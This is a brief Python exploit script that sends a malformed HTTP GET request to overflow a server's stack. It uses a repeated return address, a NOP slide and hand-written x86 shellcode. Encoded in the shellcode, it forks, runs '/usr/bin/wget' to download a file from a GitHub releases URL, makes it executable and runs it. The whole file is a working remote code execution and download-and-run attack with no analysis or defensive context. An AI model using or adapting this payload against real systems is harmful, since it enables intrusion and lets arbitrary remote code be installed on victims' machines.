#!/usr/bin/env python3
import sys, struct

get = b"GET /."
eip = struct.pack("I", 0xffffd25c + 150) * 100
nopslide = b"\x90" * 300

payload = b"\x31\xc0\xb0\x02\xcd\x80\x31\xdb\x39\xd8\x74\x33\x31\xd2\x89\xc3\x31\xc0\xb0\x07\xcd\x80\x31\xc9\x31\xc0\x50\xb0\x0f\x6a\x78\x89\xe3\x31\xc9\x66\xb9\xff\x01\xcd\x80\x31\xc0\x50\x6a\x78\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80\x6a\x0b\x58\x99\x52\x68\x2e\x33\x2f\x78\x68\x76\x31\x2e\x31\x68\x6f\x61\x64\x2f\x68\x6f\x77\x6e\x6c\x68\x65\x73\x2f\x64\x68\x6c\x65\x61\x73\x68\x79\x2f\x72\x65\x68\x6f\x6f\x73\x68\x68\x76\x73\x2f\x6d\x68\x73\x61\x74\x6f\x68\x76\x6f\x6c\x6f\x68\x6f\x6d\x2f\x72\x68\x75\x62\x2e\x63\x68\x67\x69\x74\x68\x68\x73\x3a\x2f\x2f\x68\x68\x74\x74\x70\x89\xe1\x52\x6a\x74\x68\x2f\x77\x67\x65\x68\x2f\x62\x69\x6e\x68\x2f\x75\x73\x72\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"

output = get + eip + nopslide + payload + b" HTTP/1.1"

sys.stdout.buffer.write(output)
